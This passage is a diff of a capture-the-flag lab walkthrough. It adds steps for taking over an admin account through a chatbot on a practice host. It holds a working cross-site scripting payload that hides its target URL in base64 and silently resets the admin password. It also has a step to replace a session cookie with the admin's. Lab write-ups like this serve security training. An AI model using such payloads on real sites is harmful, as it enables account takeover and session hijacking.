@@ -57,7 +57,7 @@ NOTE: In real world, once you enumerate the directory on both port, you'll see t
 - There should be an alert.
 - TIPS: Reset the chatbot / Clear all chats when you experiment different payloads
 
-#### Flag 2.1
+#### Flag 2.1 
 1. Inject the following payload into the chatbot
 
 ```
@@ -79,7 +79,9 @@ NOTE: In real world, once you enumerate the directory on both port, you'll see t
 
 <img width="837" height="390" alt="Screenshot 2026-03-11 at 8 10 14 PM" src="https://github.com/user-attachments/assets/ea6d9477-c90d-4aa0-a851-2f883c12843a" />
 
+4. Replace the current cookie with admin's & we should get the flag.
 
+   
 #### Flag 2.2
   1. Inject this payload into the chatbot
 
@@ -97,3 +99,27 @@ NOTE: In real world, once you enumerate the directory on both port, you'll see t
   3. Log out and login as the admin with a new password `admin:password`
      
 <img width="752" height="508" alt="Screenshot 2026-03-11 at 6 49 24 PM" src="https://github.com/user-attachments/assets/034094ff-b0e1-4be2-8c96-70089128653c" />
+
+#### Flag 2.3
+1. Inject the following payload into the Chatbot to change the admin's password to `pass123`:
+```
+<script>
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', atob('aHR0cDovL3dvcmxkd2FwLnRobTo4MDgxL2NoYW5nZV9wYXNzd29yZC5waHA='), true);
+  xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+  xhr.onreadystatechange = function () {
+    if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+      alert('Password changed');
+    }
+  };
+  xhr.send('action=execute&new_password=pass123');
+</script>
+```
+2. We should get an alert **"Password changed"** if the attack is successful
+   
+<img width="1419" height="695" alt="Screenshot 2026-03-11 at 8 49 18 PM" src="https://github.com/user-attachments/assets/1e1cf7b7-ec14-49cb-a5b8-230bc8d1664e" />
+
+3. Log in with the new password for admin `admin:pass123`
+
+4. 
